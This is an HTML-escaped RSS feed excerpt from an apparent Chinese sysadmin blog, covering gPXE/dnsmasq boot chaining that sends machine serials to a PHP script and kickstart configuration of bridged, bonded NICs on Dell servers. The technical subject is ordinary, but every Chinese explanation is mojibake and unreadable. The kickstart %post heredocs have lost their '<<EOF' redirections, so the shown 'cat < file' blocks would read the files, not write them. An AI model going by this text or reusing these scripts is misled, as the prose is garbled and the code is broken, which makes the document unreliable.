&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-boot&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;net:#gpxe,gpxe-1.0.1-undionly.kpxe,gxe/bootserver,172.16.36.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-boot&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;http://172.16.8.1/ks/boot.txt  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼šgpxe-1.0.1-undionly.kpxeæ˜¯æ”¾åœ¨/tftpboot/gpxe/ä¹‹ä¸‹çš„&lt;/p&gt;
&lt;p&gt;ä¸Šé¢æœ‰å¾ˆå¤šç„æœºï¼Œdhcp-rangeæ˜¯éšä¾¿è®¾ä¸€ä¸ªåœ°å€æ± ï¼Œå› ä¸ºæœ€ç»ˆå®é™…æ˜¯gpxeæ¥å†³å®šåœ°å€ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡dhcpå¾—åˆ°çš„åœ°å€åè€Œä¸é‡è¦äº†ã€‚dhcp-no-overrideä¸€å®šè¦æœ‰ï¼Œå¦åˆ™gpxeæœ‰bugï¼Œæ— æ³•å¯åŠ¨ã€‚&lt;/p&gt;
&lt;p&gt;å…¶æ¬¡åŒ¹é…gpxeï¼Œå‡¡æ˜¯175çš„éƒ½æ˜¯gpxeï¼Œä¸ºä»€ä¹ˆè¦åŒ¹é…å‘¢ï¼Ÿçœ‹ä¸‹é¢ï¼Œæœ‰ä¸¤ä¸ªdhcp-bootå¯åŠ¨é€‰é¡¹ï¼Œ#pxeï¼Œ#è¡¨ç¤ºä¸æ˜¯ï¼Œè¿™è¡Œæ„æ€æ˜¯:ä¸æ˜¯gpxeå¯åŠ¨çš„è¯ç”¨/tftp/gpxe/gpxe-1.0.1-undionly.kpxeæ¥å¯åŠ¨ï¼Œdhcpçš„serveræ˜¯172.16.36.1ã€‚ç¬¬äºŒè¡Œå¦‚æœæ˜¯gpxeå¯åŠ¨çš„è¯ï¼Œå°±chainåˆ°[http://172.16.8.1/ks/boot.txt]å»å¯åŠ¨&lt;/p&gt;
&lt;p&gt;å‘µå‘µï¼Œå¦‚æœä¸è¿™ä¹ˆè®¾ç½®ï¼Œå°±ç”¨ä¸€è¡Œçš„è¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dhcp-boot&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;gpxe-1.0.1-undionly.kpxe,gxe/bootserver,172.16.36.1  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å°±ä¼šé™·å…¥æ­»å¾ªç¯ï¼Œé¦–å…ˆpxeå¯åŠ¨ï¼ŒæŠ“äº†ä¸ªgpxeï¼Œgpxeåˆå¯åŠ¨æŠ“äº†ä¸ªgpxeï¼ŒåˆæŠ“gpxeï¼Œå¾ªç¯å¾€å¤æ²¡ç©æ²¡äº†ã€‚æ‰€ä»¥å¿…é¡»æ ‡è®°gpxeï¼Œå¹¶è·³å‡ºè¿™ä¸ªå¾ªç¯ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åœ¨172.16.8.1ä¸Šé¢å»ºç«‹/centos7çš„yumå®‰è£…æºï¼ŒåŒæ—¶å»ºç«‹/ksç›®å½•ã€‚å‡†å¤‡boot.txtï¼Œboot2.phpï¼Œboot3.phpï¼Œcentos7.kså››ä¸ªæ–‡ä»¶ï¼Œä¸‹é¢ä¸€ä¸ªä¸€ä¸ªè§£é‡Šï¼š&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæ˜¯boot.txt&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat boot.txt  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#!gpxe&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chain http://172.16.8.1/ks/boot2.php?uuid&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;uuid&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;mac&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;mac&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;busid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;busid&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;ip&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;hostname&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;hostname:uristring&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;serial&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;serial:uristring&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;asset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;asset:uristring&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;manufacturer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;manufacturer:uristring&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;product&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;product:uristring&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¤§å®¶çœ‹ä¸Šé¢ï¼Œboot.txtæ˜¯ä¸ªgpxeè„šæœ¬ï¼Œå®é™…æ˜¯è®©gpxeå‘boot2.phpä¼ è¾“äº†ä¸€äº›æ•°æ®è¿‡æ¥ï¼Œæœ‰æœºå™¨çš„uuid/mac/busid/hostname/serial/productç­‰ç­‰ã€‚ç»™ä¸ªå…·ä½“çš„ä¾‹å­ï¼Œä»access.logçœ‹åˆ°å®é™…å‘è¿‡æ¥çš„è¯·æ±‚å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /ks/boot2.php?uuid=%5C44454c4c-5600-1054-8042-b1c04f433532&amp;amp;mac=%5Cec%3Af4%3Abb%3Ad9%3A96%3A40&amp;amp;busid=%5C01%3A80%3A86%3A15%3A21&amp;amp;ip=%5C172.16.36.100&amp;amp;hostname=%5C&amp;amp;serial=%5C1VTBC52&amp;amp;asset=%5C&amp;amp;manufacturer=%5CDell%20Inc.&amp;amp;product=%5CPowerEdge%20R730 HTTP/1.0&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;46&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;gPXE/1.0.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;çœ‹ä¸Šé¢ï¼Œæœ‰å¾ˆå¤šä¿¡æ¯ï¼Œç½‘å¡çš„ç‰©ç†åœ°å€ï¼Œè¿˜æœ‰serialï¼Œå¯¹åº”dellå°±æ˜¯svc tagå·ï¼Œè¿˜æœ‰æœºå™¨ç±»åˆ«PowerEdge R730ï¼Œè¿™æ˜¯ä¸ªå¥½ä¸œè¥¿å•Šã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è´­ä¹°æœºå™¨çš„æ—¶å€™è‚¯å®šæœ‰åºåˆ—å·ï¼Œä¸Šæ¶åˆ°æœºæˆ¿çš„æ—¶å€™ï¼Œå¯ä»¥è®©idcæŠ„ä¸‹æ¥æœºæŸœå’Œåºåˆ—å·ï¼Œç„¶åæˆ‘ä»¬è®©ç½‘ç®¡è§„åˆ’å¥½ipï¼Œå†è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨serialæ¥ç¡®å®šæœºå™¨åº”è¯¥æŒ‰å“ªä¸ªæ¨¡æ¿å®‰è£…ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>kickstartå®‰è£…è„šæœ¬ä¸­å¦‚ä½•åŒæ—¶é…ç½®bridgeå’Œbond</title>
      <link>https://rendoumi.com/posts/20240118-kickstart_bongding/</link>
      <pubDate>Thu, 18 Jan 2024 12:00:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240118-kickstart_bongding/</guid>
      <description>&lt;p&gt;å¦‚ä½•åœ¨&lt;code&gt;kickstart&lt;/code&gt;è„šæœ¬ä¸­æ—¢é…ç½®brï¼Œåˆé…ç½®bondingå‘¢ï¼Ÿ&lt;/p&gt;
&lt;h2 id=&#34;åŸºæœ¬ç¯‡&#34;&gt;åŸºæœ¬ç¯‡ï¼š&lt;/h2&gt;
&lt;p&gt;ä»¥Dell R730ä¸ºä¾‹ï¼Œç‰©ç†ç½‘å¡åç§°æ˜¯em1/em2/em3/em4&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;network  --device&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;br0   --noipv6  --onboot&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes --bridgeslaves&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;bond0 --gateway&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.16.37.254 --ip&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.16.36.2 --nameserver&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.16.8.1 --netmask&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;255.255.254.0 --activate  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;network  --device&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;bond0 --noipv6  --onboot&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes --bondslaves&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;em1,em2 --bondopts&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;mode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;active-backup,balance-rr&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;primary&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;em1,miimon&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;80,updelay&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;60000&lt;/span&gt; --activate  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;network --device&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;em1 --noipv6 --nodns --onboot&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes --activate  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;network --device&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;em2 --noipv6 --nodns --onboot&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes --activate  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;network --device&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;em3 --noipv6 --nodns --onboot&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes --activate  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;network --device&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;em4 --noipv6 --nodns --onboot&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes --activate  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;network  --hostname&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;myhost-16-36-2  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ä»¥ä¸Šï¼Œæ˜¯åªåšäº† em1 å’Œ em2 ç»‘å®šæˆä¸º bond0 ï¼Œç„¶å br0 å¯åŠ¨åœ¨ bond0 ä¹‹ä¸Šã€‚&lt;/p&gt;
&lt;h2 id=&#34;è¿›é˜¶ç¯‡&#34;&gt;è¿›é˜¶ç¯‡ï¼š&lt;/h2&gt;
&lt;p&gt;åŸºæœ¬ç¯‡çš„åšæ³•å›ºç„¶æ˜¯åšäº†å››ç½‘å¡ç»‘å®šå’Œæ¡¥æ¥ï¼Œå‰¯ä½œç”¨ä¹Ÿæ˜¯å¾ˆå¯æ€•çš„ã€‚&lt;/p&gt;
&lt;p&gt;å¤§å®¶å»çœ‹/etc/sysconfig/network-scriptsï¼Œ é‡Œé¢æœ‰ä¸€å †çš„ifcfg-br0-slave_1ï¼Œifcfg-bond0-slave_1ï¼Œ ifcfg-bond0-slave_2ï¼Œæ›´å¯æ¶çš„æ˜¯è¿›ç¨‹ä¸­è·‘ç€å¥½å‡ ä¸ªdhcp-clientï¼Œä¸€æƒ³å°±æ˜ç™½äº†ï¼Œè¿™æ˜¯NetworkManageræå¾—ã€‚em3å’Œem4ä¸æ–­å»å¯åœç«¯å£ï¼Œè¯•å›¾è·å¾—åœ°å€ï¼Œå¯¼è‡´äº¤æ¢æœºç«¯å£å¿½æ–­å¿½é€šã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªè¯•å›¾è‡ªåŠ¨åŒ–ç½‘ç»œçš„ä¸œè¥¿åœ¨æœåŠ¡å™¨è·‘ä¸Šå®åœ¨æ˜¯å¤ªæ— èŠäº†ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥ä¸Šé¢çš„åšæ³•æ‘’å¼ƒã€‚åœ¨%postæŠŠç½‘ç»œæå¥½ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;... 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%packages 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;@compat-libraries 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;@core 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net-tools 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chrony 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bridge-utils 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%end 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;network  --bootproto&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;static --device&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;em1 --noipv6 --nodns  --onboot&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes --gateway&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.16.37.254 --ip&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.16.36.2  --nameserver&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.16.8.1 --netmask&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;255.255.254.0 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;network  --bootproto&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dhcp --device&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;em2 --noipv6 --nodns --onboot&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;network  --bootproto&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dhcp --device&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;em3 --noipv6 --nodns --onboot&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;network  --bootproto&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dhcp --device&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;em4 --noipv6 --nodns --onboot&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;network  --hostname&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;myhost-16-36-2 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%post 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; yum -y erase NetworkManager 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; cat &amp;lt;/etc/sysconfig/network-scripts/ifcfg-br0 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;DEVICE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;br0 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;TYPE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Bridge 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;BOOTPROTO&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;static 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;ONBOOT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;IPADDR&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.16.36.2 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;NETMASK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;255.255.254.0 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;GATEWAY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.16.37.254 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; EOF 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; cat &amp;lt; /etc/modprobe.d/bonding.conf 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nb&#34;&gt;alias&lt;/span&gt; bond0 bonding 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;BONDING_OPTS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;miimon=100 mode=1 primary=em1&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; EOF 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; cat &amp;lt; /etc/sysconfig/network-scripts/ifcfg-bond0 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;DEVICE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;bond0 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;ONBOOT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;USERCTL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;BRIDGE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;br0 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; EOF 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; cat &amp;lt; /etc/sysconfig/network-scripts/ifcfg-em1 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;DEVICE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;em1 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;USERCTL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;ONBOOT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;MASTER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;bond0 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;SLAVE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;BRIDGE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;br0&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; EOF 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; cat &amp;lt; /etc/sysconfig/network-scripts/ifcfg-em2 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;DEVICE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;em2 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;USERCTL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;ONBOOT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;MASTER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;bond0 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;nv&#34;&gt;SLAVE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes 
